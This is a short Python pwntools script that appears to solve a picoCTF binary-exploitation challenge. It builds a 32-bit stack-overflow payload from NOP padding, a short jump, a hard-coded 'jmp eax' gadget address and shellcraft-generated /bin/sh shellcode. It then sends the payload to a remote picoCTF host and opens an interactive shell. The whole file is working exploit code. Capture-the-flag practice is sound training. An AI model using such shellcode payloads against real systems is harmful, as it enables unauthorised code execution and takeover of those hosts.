from pwn import *
import sys

context.bits = 32

jmp_eax = p32(0x0805333b)
jmp_short = b'\xeb\x04'

payload = b'\x90' * 26
payload += jmp_short
payload += jmp_eax

payload += asm(shellcraft.i386.linux.sh())

p = remote('saturn.picoctf.net', 59363)

p.sendline(payload)
p.interactive()
